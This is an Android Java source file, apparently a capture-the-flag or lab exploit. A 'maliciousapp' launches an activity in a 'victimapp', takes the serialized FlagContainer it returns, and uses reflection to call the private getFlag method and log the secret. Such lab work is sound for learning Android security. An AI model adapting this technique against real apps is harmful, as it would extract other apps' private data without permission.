package com.example.maliciousapp;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcelable;
import android.util.Log;

import com.example.victimapp.FlagContainer;

import java.io.Serializable;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class MainActivity extends AppCompatActivity implements  Serializable{

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.e("inspect ", "alive");

        Intent serialIntent = new Intent();
        serialIntent.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.SerialActivity"));
        startActivityForResult(serialIntent, 100);

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 100) {
            FlagContainer intent = (FlagContainer) data.getSerializableExtra("flag");
            try {
                Method m = intent.getClass().getDeclaredMethod("getFlag");
                m.setAccessible(true);
                String result = (String) m.invoke(intent);
                Log.e("inspect ", result);
            } catch (NoSuchMethodException e) {
                e.printStackTrace();
            } catch (InvocationTargetException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }

        }
    }

    public static String bundle2string(Bundle bundle){
        if (bundle == null) {
            return null;
        }
        String string = "Bundle{";
        for (String key : bundle.keySet()) {
            string += " " + key + " => " + bundle.get(key) + ";";
        }
        string += " }Bundle";
        return string;
    }


}